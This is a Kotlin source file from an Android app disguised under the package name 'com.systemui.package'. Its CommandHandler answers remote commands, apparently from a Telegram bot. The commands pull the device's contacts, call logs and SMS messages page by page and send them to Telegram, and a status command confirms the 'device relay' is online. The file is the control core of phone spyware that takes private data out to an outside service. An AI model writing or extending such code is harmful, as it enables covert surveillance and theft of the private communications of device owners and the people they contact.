package com.systemui.package

import android.content.Context
import android.util.Log
import com.systemui.package.data.CallLogRepository
import com.systemui.package.data.ContactsRepository
import com.systemui.package.data.SmsRepository
import com.systemui.package.utils.MessageFormatter
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object CommandHandler {
    private const val TAG = "DeviceRelay"

    suspend fun handle(context: Context, command: String) {
        try {
            when (command.trim()) {
                "/contacts" -> fetchContacts(context, 1)
                "/contacts2" -> fetchContacts(context, 2)
                "/calllog1" -> fetchCallLog(context, "today")
                "/calllog2" -> fetchCallLog(context, "yesterday")
                "/msgs1" -> fetchSms(context, 1)
                "/msgs2" -> fetchSms(context, 2)
                "/msgs3" -> fetchSms(context, 3)
                "/status" -> TelegramApi.sendMessage("✅ Device relay is online.")
                else -> TelegramApi.sendMessage("❓ Unknown command.\nAvailable: /contacts /contacts2 /calllog1 /calllog2 /msgs1 /msgs2 /msgs3 /status")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error: $command", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }

    private suspend fun fetchContacts(context: Context, page: Int) = withContext(Dispatchers.IO) {
        try {
            val all = ContactsRepository.getAllContacts(context)
            val start = (page - 1) * 50
            val end = minOf(start + 50, all.size)
            val pageData = if (start < all.size) all.subList(start, end) else emptyList()
            TelegramApi.sendLongMessage(MessageFormatter.formatContacts(pageData, page, all.size))
        } catch (e: Exception) {
            Log.e(TAG, "contacts error", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }

    private suspend fun fetchCallLog(context: Context, date: String) = withContext(Dispatchers.IO) {
        try {
            val logs = CallLogRepository.getCallLogs(context, date)
            TelegramApi.sendLongMessage(MessageFormatter.formatCallLogs(logs, date))
        } catch (e: Exception) {
            Log.e(TAG, "calllog error", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }

    private suspend fun fetchSms(context: Context, page: Int) = withContext(Dispatchers.IO) {
        try {
            val msgs = SmsRepository.getSms(context, page, 10)
            TelegramApi.sendLongMessage(MessageFormatter.formatSms(msgs, page))
        } catch (e: Exception) {
            Log.e(TAG, "sms error", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }
}